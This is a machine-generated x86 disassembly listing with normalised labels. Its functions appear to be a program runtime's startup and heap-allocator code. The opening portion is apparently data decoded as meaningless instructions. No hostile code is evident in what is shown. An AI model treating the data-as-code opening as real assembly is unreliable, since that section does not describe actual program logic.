add [ eax ] al
add al [ esi ]
dec ebp
outsd
jne r-xdata
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] ch
inc eax
add [ eax + eax ] dl
add [ eax ] al
add cl [ eax ]
push esp
jns r-xdata
outsb
jb r-xdata
add [ edx ] al
add [ ebx + 0x402394c0 ] cl
add [ ecx + 0x73655250 ] dl
push ebx
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add cl [ ebx + eax * 2 ]
outsd
dec ecx
outsb
jae r-xdata
jne r-xdata
inc ebx
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
pop es
push edx
popad
ja r-xdata
add [ eax ] al
sar bh 0x25
jo r-xdata
je r-xdata
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ edx ]
dec ecx
outsb
add [ eax + eax ] al
dec ecx
outsb
outsw
add al [ eax ]
pushfd
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
add cl [ eax ]
push edx
jae r-xdata
dec ebx
add [ ebx + 0x6025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x5025ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x47da0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x4025ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x4bda0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x3c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x3025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x2025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x1025ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0xc25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x825ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x4fda0040 ] cl
pop ecx
dec ebx
add [ ebx + 0x425ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x25ffc0 ] cl
pop edx
dec ebx
add [ ebx - 0x3da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x57da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x5bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x5fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x7da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0xbda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x67da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x6bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x6fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0xfda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x13da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x17da0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x1bda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x1fda0040 ] cl
pop ecx
dec ebx
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add bh al
add al 0x24
inc esp
add [ eax ] al
add [ eax + ebp * 8 + 0x42 ] dl
sar bh 0x25
push 0x8b004b5a
sar bh 0x25
pop edx
imul sp [ ebp + 0x72 ] 0x2
add al [ eax ]
mov eax eax
[ edx ] eax
inc eax
retn
add al [ fs : eax ]
add al [ eax ]
mov eax eax
xchg esp eax
and eax [ eax ]
adc al 0xd
push eax
push edx
jae r-xdata
retn
imul ebp [ esi + 0x67 ] 0xac636552
lodsb [ esi ]
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ esp + eax * 2 ]
popad
je r-xdata
je r-xdata
xor [ edx ] ah
inc eax
popad
je r-xdata
mov eax eax
dec ebx
add [ ebx + 0x6c25ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x6825ffc0 ] cl
pop edx
dec ebx
add [ ebx + 0x6425ffc0 ] cl
pop edx
je r-xdata
dec ecx
outsb
jae r-xdata
and al [ eax ]
add al 0x0
add [ eax ] al
add cl [ ecx ]
push esp
jns r-xdata
add [ edx ] dl
inc eax
add [ eax + eax ] al
push cs
add al [ eax ]
add al [ eax ]
nop
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
arpl [ gs : eax ] cx
popad
outsb
arpl [ ebp + 0x2 ] sp
add al bh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ ebx ]
add [ eax ] al
add [ eax ] al
add al [ esi + ecx * 2 ]
js r-xdata
popad
bound ebp [ ebp + 0x2 ]
add [ eax + edx + 0x80040 ] bl
add [ eax ] al
add cl [ ecx ]
push ebp
outsb
imul esi [ ebx + eax * 2 + 0x6f ] 0x2746e75
add [ esi + ebx ] ch
inc eax
push esp
sub_4025c0
push ebx
add esp 0xffffffbc
mov ebx 0xa
mov [ esp ] 0x44
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_402788
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_4027d4
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
mov ecx [ eax + 0x28 ]
mov [ edx + 0x28 ] ecx
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_4027f8
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
mov ecx [ eax + 0x30 ]
mov [ edx + 0x30 ] ecx
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_402824
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
mov ecx [ eax + 0x38 ]
mov [ edx + 0x38 ] ecx
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_402854
fild [ eax ]
fild [ eax + 0x8 ]
fild [ eax + 0x10 ]
fild [ eax + 0x18 ]
fild [ eax + 0x20 ]
fild [ eax + 0x28 ]
fild [ eax + 0x30 ]
fild [ eax + 0x38 ]
mov ecx [ eax + 0x40 ]
mov [ edx + 0x40 ] ecx
fistp [ edx + 0x38 ]
fistp [ edx + 0x30 ]
fistp [ edx + 0x28 ]
fistp [ edx + 0x20 ]
fistp [ edx + 0x18 ]
fistp [ edx + 0x10 ]
fistp [ edx + 0x8 ]
fistp [ edx ]
retn
sub_40288c
sub ecx 0xc
add eax ecx
add edx ecx
neg ecx
jns r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
mov eax [ ecx + eax + 0x8 ]
mov [ ecx + edx + 0x8 ] eax
retn
fild [ ecx + eax ]
fild [ ecx + eax + 0x8 ]
fistp [ ecx + edx + 0x8 ]
fistp [ ecx + edx ]
add ecx 0x10
js r-xdata
sub_4028d8
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
cmp ecx edx
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
retn
mov eax 0xfffffffe
mov ecx edx
rol eax cl
and [ rw-data ] eax
retn
sub_402918
sub edx 0xb30
shr edx 0x8
sub edx 0x3ff
sbb ecx ecx
and edx ecx
add edx 0x3ff
lea ecx [ edx * 8 + rw-data ]
mov edx [ ecx + 0x4 ]
cmp edx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ ecx + 0x4 ] eax
je r-xdata
sub ecx rw-data
mov edx ecx
shr ecx 0x3
movzx edx dh
mov eax 0x1
shl eax cl
or [ edx * 4 + rw-data ] eax
mov eax 0x1
mov ecx edx
shl eax cl
or [ rw-data ] eax
retn
retn
sub_402978
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test [ eax - 0x4 ] 0x1
jne r-xdata
retn
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
cmp edx 0xb30
jb r-xdata
or [ eax - 0x4 ] 0x8
mov edx [ rw-data ]
sub eax edx
mov ecx [ rw-data ]
sub eax ecx
add edx ecx
jmp r-xdata
call sub_4028d8
mov eax [ rw-data ]
mov edx 0xfffffff0
and edx [ eax - 0x4 ]
retn
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jae sub_402918
sub_4029e4
push ebx
mov ebx eax
call sub_402978
push 0x4
push 0x1000
push 0x13fff0
push 0x0
call sub_4025ec
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
pop ebx
retn
mov edx [ rw-data ]
mov ecx eax
mov [ ecx ] rw-data
mov [ rw-data ] eax
mov [ ecx + 0x4 ] edx
mov [ edx ] eax
mov edx eax
add edx 0x13fff0
mov ecx edx
sub ecx 0x4
mov [ ecx ] 0x2
mov ecx 0x13ffe0
sub ecx ebx
mov [ rw-data ] ecx
sub edx ebx
mov eax edx
mov [ rw-data ] eax
or ebx 0x2
mov edx eax
sub edx 0x4
mov [ edx ] ebx
pop ebx
retn
sub_402a5c
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp r-xdata
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40274c
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_4025fc
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_40274c
test al al
je r-xdata
push 0xa
call sub_4025fc
sub_402bac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov edi eax
mov eax edi
sub eax 0x4
mov eax [ eax ]
mov ebx eax
and ebx 0xfffffff0
sub ebx 0x14
cmp ebx esi
jae r-xdata
shr ebx 0x1
cmp esi ebx
jb r-xdata
mov edx ebx
shr edx 0x2
add edx ebx
cmp edx esi
jbe r-xdata
mov eax esi
call sub_402cf8
mov ebx eax
test ebx ebx
je r-xdata
mov ebx edi
sub edi 0x10
mov [ edi + 0x8 ] esi
jmp r-xdata
mov ebp esi
mov ebp edx
jmp r-xdata
mov eax ebx
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi 0x40a2c
jbe r-xdata
mov eax ebp
call sub_402cf8
mov ebx eax
test ebx ebx
je r-xdata
and [ esp + 0x10 ] 0xffff0000
mov edx esi
sub edx ebx
mov eax [ esp + 0x10 ]
cmp edx eax
jae r-xdata
mov edx edi
sub edx 0x10
and eax 0xfffffff0
add edx eax
mov [ esp ] edx
push 0x1c
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
call sub_402578
cmp [ esp + 0x14 ] 0x10000
jne r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_4028bc
mov eax edi
call sub_40307c
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
cmp ebp 0x40a2c
jbe r-xdata
mov edx ebp
sub edx ebx
add edx 0x10000
dec edx
and edx 0xffff0000
mov ebx edx
cmp eax ebx
jae r-xdata
mov eax edi
sub eax 0x10
mov eax [ eax + 0x8 ]
mov edx ebx
mov ecx edi
xchg ecx eax
call sub_40288c
mov eax edi
call sub_40307c
jmp r-xdata
mov eax ebx
sub eax 0x10
mov [ eax + 0x8 ] esi
push 0x4
push 0x2000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_4025ec
test eax eax
je r-xdata
mov ebx eax
push 0x4
push 0x1000
push ebx
mov eax [ esp + 0xc ]
push eax
call sub_4025ec
test eax eax
je r-xdata
mov eax edi
sub eax 0x10
mov [ eax + 0x8 ] esi
mov edx eax
add ebx [ edx + 0xc ]
or ebx 0x8
mov [ edx + 0xc ] ebx
mov ebx edi
jmp r-xdata
sub_402cf8
lea edx [ eax + 0x3 ]
shr edx 0x3
cmp eax 0xa2c
push ebx
mov cl [ rw-data ]
ja r-xdata
cmp eax 0x40a2c
ja r-xdata
test cl cl
movzx eax [ edx + rw-data ]
lea ebx [ eax * 8 + rw-data ]
jne r-xdata
pop ebx
test eax eax
jns r-xdata
lea ebx [ eax + 0xd3 ]
and ebx 0xffffff00
add ebx 0x30
test cl cl
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx 0xfffffff8
cmp edx ebx
je r-xdata
push ebx
push esi
push edi
push ebp
mov ebp eax
lea esi [ ebp + 0x10010 ]
dec esi
add esi 0x4
and esi 0xffff0000
push 0x4
push 0x101000
push esi
push 0x0
call sub_4025ec
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea edx [ ebx - 0xb30 ]
mov ecx edx
shr edx 0xd
shr ecx 0x8
mov eax 0xffffffff
shl eax cl
and eax [ edx * 4 + rw-data ]
je r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
mov edx [ ebx + 0x10 ]
movzx ecx [ ebx + 0x2 ]
add ecx eax
cmp eax [ ebx + 0xc ]
ja r-xdata
add [ edx + 0xc ] 0x1
and ecx [ eax - 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ eax - 0x4 ] edx
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov [ edi + 0x8 ] ebp
or esi 0x4
mov [ edi + 0xc ] esi
call sub_402a5c
mov eax [ rw-data ]
mov [ edi ] rw-data
mov [ rw-data ] ebx
mov [ edi + 0x4 ] eax
mov [ eax ] ebx
mov [ rw-data ] 0x0
add ebx 0x10
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xfffffffe
mov ecx edx
shl eax cl
and eax [ rw-data ]
je r-xdata
and ecx 0xffffffe0
bsf eax eax
or ecx eax
jmp r-xdata
add ebx 0x20
mov eax 0x100
[ ebx ] ah
je r-xdata
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
add [ edx + 0xc ] 0x1
mov [ ebx + 0x8 ] ecx
mov [ ebx ] 0x0
mov [ eax - 0x4 ] edx
pop ebx
retn
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] ebx
mov [ ebx + 0x4 ] ecx
mov [ ebx ] 0x0
pop ebx
retn
mov [ ebx ] 0x0
pop ebx
retn
push 0x0
call sub_4025fc
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov ecx [ rw-data ]
sub ecx ebx
jb r-xdata
bsf edx eax
mov eax [ edx * 4 + rw-data ]
bsf ecx eax
mov eax edx
shl eax 0x5
or ecx eax
jmp r-xdata
push esi
push edi
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ eax ] edi
cmp edi eax
jne r-xdata
sub ebx 0x40
pause
cmp [ rw-data ] 0x0
jne r-xdata
movsx esi [ ebx + 0x1 ]
and esi [ rw-data ]
je r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
push 0xa
call sub_4025fc
jmp r-xdata
mov eax ebx
call sub_4029e4
mov eax [ rw-data ]
sub eax ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
or ebx 0x2
mov [ eax - 0x4 ] ebx
jmp r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
mov edx edi
sub edx ebx
je r-xdata
mov eax 0xfffffffe
rol eax cl
and [ edx * 4 + rw-data ] eax
jne r-xdata
push 0x0
call sub_4025fc
mov eax 0x100
[ ebx ] ah
je r-xdata
movzx ecx [ ebx + 0x18 ]
mov edi [ rw-data ]
cmp edi ecx
jb r-xdata
bsf eax esi
lea esi [ eax * 8 ]
mov ecx [ eax * 4 + rw-data ]
bsf ecx ecx
lea ecx [ ecx + esi * 4 ]
lea edi [ ecx * 8 + rw-data ]
mov esi [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ edx ] edi
cmp edi edx
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
and [ edi + esi - 0x4 ] 0xf7
lea eax [ ebx + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
cmp edx 0xb30
jb r-xdata
btr [ rw-data ] edx
push 0xa
call sub_4025fc
jmp r-xdata
movzx eax [ ebx + 0x1a ]
mov edi eax
call sub_4029e4
mov esi eax
test eax eax
jne r-xdata
mov esi [ rw-data ]
movzx ecx [ ebx + 0x1a ]
lea edx [ ecx + 0xb30 ]
cmp edi edx
jb r-xdata
mov edi 0xfffffff0
and edi [ esi - 0x4 ]
cmp edi 0x10a60
jb r-xdata
mov edx 0xfffffffe
rol edx cl
and [ eax * 4 + rw-data ] edx
jne r-xdata
push 0x0
call sub_4025fc
mov eax 0x100
[ rw-data ] ah
je r-xdata
lea ecx [ ebx + 0x2 ]
mov [ esi - 0x4 ] ecx
mov [ rw-data ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_402918
jmp r-xdata
lea ecx [ edi + 0x6 ]
mov [ esi - 0x4 ] ecx
xor eax eax
mov [ rw-data ] al
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] 0x1
mov [ ebx + 0x10 ] esi
lea eax [ esi + 0x20 ]
movzx ecx [ ebx + 0x2 ]
lea edx [ ecx + eax ]
mov [ ebx + 0x8 ] edx
add edi esi
sub edi ecx
mov [ ebx + 0xc ] edi
mov [ ebx ] 0x0
mov [ eax - 0x4 ] esi
pop edi
pop esi
pop ebx
retn
mov [ rw-data ] al
mov [ ebx ] al
pop edi
pop esi
pop ebx
retn
sub esi edi
sub [ rw-data ] edi
mov [ rw-data ] esi
jmp r-xdata
mov edi ecx
and [ edi + esi - 0x4 ] 0xf7
mov edx edi
movzx edi [ ebx + 0x1a ]
sub edx edi
lea eax [ edi + esi ]
lea ecx [ edx + 0x3 ]
mov [ eax - 0x4 ] ecx
mov [ edx + eax - 0x8 ] edx
call sub_402918
jmp r-xdata
btr [ rw-data ] eax
push 0xa
call sub_4025fc
jmp r-xdata
sub_40307c
mov edx [ eax - 0x4 ]
test dl 0x7
mov ecx eax
push ebx
mov bl [ rw-data ]
jne r-xdata
test dl 0x5
jne r-xdata
test bl bl
mov ebx [ edx ]
jne r-xdata
pop ebx
test dl 0x3
je r-xdata
and edx 0xfffffff0
test bl bl
mov ebx edx
push esi
mov esi eax
jne r-xdata
mov eax 0x100
[ ebx ] ah
je r-xdata
sub [ edx + 0xc ] 0x1
mov eax [ edx + 0x8 ]
je r-xdata
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi eax
sub esi 0x10
call sub_402a5c
mov eax esi
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0xc ]
test dl 0x8
jne r-xdata
mov eax 0xffffffff
retn
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ ebx + esi - 0x4 ] 0x1
mov ecx [ ebx + esi - 0x4 ]
jne r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
test eax eax
je r-xdata
test eax eax
mov [ edx + 0x8 ] ecx
lea eax [ eax + 0x1 ]
mov [ ecx - 0x4 ] eax
je r-xdata
mov ebx esi
mov ebp edx
and ebp 0xfffffff0
xor edi edi
push 0x8000
push 0x0
push esi
call sub_4025f4
test eax eax
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebx + esi ]
and ecx 0xfffffff0
add ebx ecx
cmp ecx 0xb30
jb r-xdata
or ecx 0x8
mov [ ebx + esi - 0x4 ] ecx
push ecx
push edx
push 0x0
call sub_4025fc
pop edx
pop ecx
mov eax 0x100
[ ebx ] ah
je r-xdata
mov [ ebx + 0xc ] eax
mov eax [ edx + 0x14 ]
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x14 ] eax
xor eax eax
cmp [ ebx + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edx + 0x14 ] ebx
mov [ edx + 0x4 ] ecx
mov [ ecx + 0x14 ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx ] 0x0
xor eax eax
pop ebx
retn
xor eax eax
mov [ ebx ] al
pop ebx
retn
mov esi [ esp + 0x14 ]
cmp ebp esi
jbe r-xdata
or edi 0xffffffff
jmp r-xdata
or edi 0xffffffff
jmp r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_4025fc
mov eax 0x100
[ rw-data ] ah
je r-xdata
test [ esi - 0x4 ] 0x8
jne r-xdata
call sub_4028d8
jmp r-xdata
mov ecx [ esi - 0x8 ]
sub esi ecx
add ebx ecx
cmp ecx 0xb30
jb r-xdata
cmp ebx 0x13ffe0
je r-xdata
push ecx
push edx
push 0xa
call sub_4025fc
pop edx
pop ecx
jmp r-xdata
mov [ ebx ] al
mov eax edx
mov edx [ edx - 0x4 ]
mov bl [ rw-data ]
jmp r-xdata
test edi edi
jne r-xdata
sub ebp esi
add ebx esi
jmp r-xdata
push 0xa
call sub_4025fc
jmp r-xdata
mov eax esi
call sub_4028d8
jmp r-xdata
cmp [ rw-data ] 0x13ffe0
jne r-xdata
lea eax [ ebx + 0x3 ]
mov [ esi - 0x4 ] eax
mov [ ebx + esi - 0x8 ] ebx
mov eax esi
mov edx ebx
call sub_402918
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
mov [ rw-data ] 0x0
mov eax edi
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp ]
mov [ eax ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax + 0x4 ] edx
push 0x1c
lea eax [ esp + 0xc ]
push eax
push ebx
call sub_402578
push 0x8000
push 0x0
push ebx
call sub_4025f4
test eax eax
jne r-xdata
lea ebx [ esi + 0x13ffe0 ]
call sub_402978
mov [ ebx - 0x4 ] 0x2
mov [ rw-data ] 0x13ffe0
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub esi 0x10
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ edx ] eax
mov [ rw-data ] 0x0
push 0x8000
push 0x0
push esi
call sub_4025f4
cmp eax 0x1
sbb eax eax
pop esi
pop ebx
retn
sub_403274
mov ecx [ eax - 0x4 ]
test cl 0x7
push ebx
push esi
mov esi eax
jne r-xdata
test cl 0x5
jne r-xdata
mov ebx [ ecx ]
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
cmp ecx edx
jb r-xdata
pop esi
pop ebx
test cl 0x3
je sub_402bac
mov ebx ecx
and ecx 0xfffffff0
push edi
lea edi [ ecx + eax ]
sub ecx 0x4
and ebx 0xf
cmp edx ecx
push ebp
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
push edi
mov edi edx
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
call sub_402cf8
test eax eax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
retn
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
lea ebp [ edx + edx ]
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi 0x40a2c
jbe r-xdata
mov ebx edx
mov eax edx
call sub_402cf8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
add eax edx
mov ebp eax
mov edi ecx
push edx
call sub_402cf8
pop edx
test eax eax
je r-xdata
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
cmp edx 0xb2c
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
mov edx eax
mov edi eax
mov eax esi
call [ ebx + 0x1c ]
mov eax esi
call sub_40307c
mov eax edi
mov [ eax - 0x8 ] edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx eax
mov ebx eax
mov eax esi
call sub_4028bc
mov eax esi
call sub_40307c
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp 0x40a2c
jbe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ebp [ edx + 0xd3 ]
and ebp 0xffffff00
add ebp 0x30
add ecx 0x4
sub ecx ebp
cmp [ rw-data ] 0x0
je r-xdata
cmp edx 0x2cc
jb r-xdata
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_40288c
mov eax esi
call sub_40307c
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ eax - 0x8 ] edx
cmp eax 0xb30
jb r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebx ebp
mov [ esi - 0x4 ] ebx
mov ebx ecx
mov edx [ edi - 0x4 ]
test dl 0x1
jne r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov edi edx
mov eax edx
call sub_402cf8
test eax eax
je r-xdata
mov edx 0xb2c
cmp ecx edx
jbe r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd3 ]
and eax 0xffffff00
add eax 0x30
lea edx [ ebp + 0x4 ]
sub edx eax
ja r-xdata
mov eax edi
push ecx
push edx
call sub_4028d8
pop edx
pop ecx
mov ebx 0xf
and ebx [ esi - 0x4 ]
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax edi
and edx 0xfffffff0
add ebx edx
add edi edx
cmp edx 0xb30
jb r-xdata
or edx 0x8
mov [ edi - 0x4 ] edx
jmp r-xdata
mov ebx 0xf
and ebx [ esi - 0x4 ]
pause
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_4028bc
mov eax esi
call sub_40307c
mov eax ebp
mov [ esi + ebp - 0x4 ] edx
lea edi [ edx + 0x3 ]
mov [ eax + esi - 0x4 ] edi
mov ebp eax
cmp edx 0xb30
jb r-xdata
and [ esi + ebp ] 0xfffffff7
add ebp 0x4
jmp r-xdata
mov [ rw-data ] 0x0
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
push ecx
push edx
push 0x0
call sub_4025fc
pop edx
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov [ edi - 0x8 ] ebx
lea eax [ ebx + 0x3 ]
mov [ esi + ebp - 0x4 ] eax
cmp ebx 0xb30
jb r-xdata
call sub_4028d8
push ecx
push 0x0
call sub_4025fc
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebp ebx
mov [ esi - 0x4 ] ebp
mov [ rw-data ] 0x0
mov eax esi
add eax esi
call sub_402918
push ecx
push edx
push 0xa
call sub_4025fc
pop edx
pop ecx
jmp r-xdata
mov [ rw-data ] 0x0
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + ebp ]
mov edx ebx
call sub_402918
push ecx
push 0xa
call sub_4025fc
pop ecx
jmp r-xdata
sub_40358c
push ebx
lea ebx [ eax - 0x1 ]
and ebx 0xfffffffc
call sub_402cf8
cmp eax 0x1
sbb ecx ecx
lea edx [ ebx + eax ]
or ebx ecx
cmp ebx 0x40a2c
jae r-xdata
pop ebx
retn
neg ebx
fldz
fst [ ebx + edx ]
add ebx 0x8
js r-xdata
mov [ edx ] ecx
